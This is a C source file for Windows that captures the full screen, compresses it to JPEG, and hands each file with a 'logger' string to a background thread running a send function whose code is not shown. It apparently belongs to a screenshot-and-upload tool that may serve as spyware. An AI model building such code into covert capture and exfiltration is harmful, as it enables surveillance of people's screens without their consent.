#include <windows.h>
#include <stdio.h>
#include "shooter.h"
#include "jpeglib.h"
#include "send.h"

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "libjpeg.lib")  // Link to libjpeg (assuming it's installed)


void checkThreads(){
    for(int i = 0; i < MAX_THREADS; i++)
    {
        if(threadHandles[i] != NULL)
        {
            DWORD threadStatus;
            BOOL status = GetExitCodeThread( threadHandles[i] , &threadStatus);
            if(!status)
            {
                printf("Failed to get exit status for handle at position %d.\nNOTE: Position is not index.\n", i+1);
                continue;
            }
            if(threadStatus != STILL_ACTIVE)    // thread has terminated
            {
                // nullify
                free((char*)listOfPending[i].filename);
                listOfPending[i].filename = NULL;
                strcpy(listOfPending[i].logger, "");
                    
                BOOL handleStatus =  CloseHandle( threadHandles[i] );
                if(!handleStatus)
                {
                    printf("Failed to close handle at position %d. ARRAY INDEX %d.\n", i + 1, i);
                    continue;
                }
                printf("Killing handle %d.\n" , i);
                threadHandles[i] = NULL;  // set to null so program never checks it after it is closed
                printf("Succesfully killed handle %d.\n" , i);
            }
        }
    }
}

// Function to save the bitmap as a JPEG file with compression
// Function to save the bitmap as a JPEG file with compression
int SaveBitmapToJPEG(HBITMAP hBitmap, const char* filename, int quality, char logger[]) {
    BITMAP bmp;
    BITMAPINFOHEADER bi;
    HANDLE hFile;
    DWORD dwBytesWritten;
    HDC hdcMem = CreateCompatibleDC(NULL);
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    // Prepare bitmap info
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    int rowSize = (bmp.bmWidth * bi.biBitCount + 31) / 32 * 4;
    int dataSize = rowSize * bmp.bmHeight;
    PBYTE lpBitmapData = (PBYTE)GlobalAlloc(GPTR, dataSize);

    // Get the pixel data
    GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, lpBitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // Flip the image vertically
    int halfHeight = bmp.bmHeight / 2;
    for (int y = 0; y < halfHeight; y++) {
        PBYTE topRow = &lpBitmapData[y * rowSize];
        PBYTE bottomRow = &lpBitmapData[(bmp.bmHeight - 1 - y) * rowSize];

        // Swap the rows
        for (int x = 0; x < rowSize; x++) {
            BYTE temp = topRow[x];
            topRow[x] = bottomRow[x];
            bottomRow[x] = temp;
        }
    }

    // Create the JPEG object for writing the file
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    FILE *outfile;

    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);

    // Open the output file
    if ((outfile = fopen(filename, "wb")) == NULL) {
        printf("Error opening output file %s\n", filename);
        return 0;
    }
    jpeg_stdio_dest(&cinfo, outfile);

    // Set JPEG parameters
    cinfo.image_width = bmp.bmWidth;
    cinfo.image_height = bmp.bmHeight;
    cinfo.input_components = 3;  // RGB
    cinfo.in_color_space = JCS_RGB;  // Color space

    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, quality, TRUE);  // Set the compression quality (0-100)

    // Start compression
    jpeg_start_compress(&cinfo, TRUE);

    // Write the image data to the JPEG file
    JSAMPROW row_pointer[1];
    while (cinfo.next_scanline < cinfo.image_height) {
        row_pointer[0] = &lpBitmapData[cinfo.next_scanline * rowSize];
        jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }

    // Finish the compression
    jpeg_finish_compress(&cinfo);
    // send file

    
    fclose(outfile);

    // Cleanup
    jpeg_destroy_compress(&cinfo);
    GlobalFree((HGLOBAL)lpBitmapData);
    DeleteDC(hdcMem);
    return 1;
}


// Function to take a screenshot and save it to a file
void CaptureScreen(const char* filename, int quality, char logger[]) {

    int freeThread = -1;

    for(int i = 0; i < MAX_THREADS; i++)
    {
        if(listOfPending[i].filename == NULL)
        {
            freeThread = i;
            break;
        }
    }

    // if no thread is currently free, no need to take a SC
    if(freeThread == -1)
    {
        free((char*)filename);
        return;
    }


    // Get the device context for the screen
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    // Get the screen's width and height
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create a bitmap that will hold the screen's data
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);

    // Select the bitmap into the memory DC
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

    // Copy the screen to the bitmap
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Save the bitmap as a JPEG file (with compression)
    SaveBitmapToJPEG(hBitmap, filename, quality, logger);

    // Clean up
  //  SelectObject(hdcMem, hOldBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    DeleteObject(hBitmap);

    printf("Screenshot saved as %s\n", filename);

    // create struct at free thread space 
    listOfPending[freeThread].filename = filename;
    strcpy(listOfPending[freeThread].logger, logger);

    printf("Creating a new thread at position %d.\n", freeThread);

    // create the thread
    threadHandles[freeThread] = CreateThread( NULL , 0 , Xend ,
        &listOfPending[freeThread] , 0 , NULL);

    // everytime program adds a new thread, it check all other threads for their completion status
    // completed threads should be released for reuse later
    checkThreads();
}


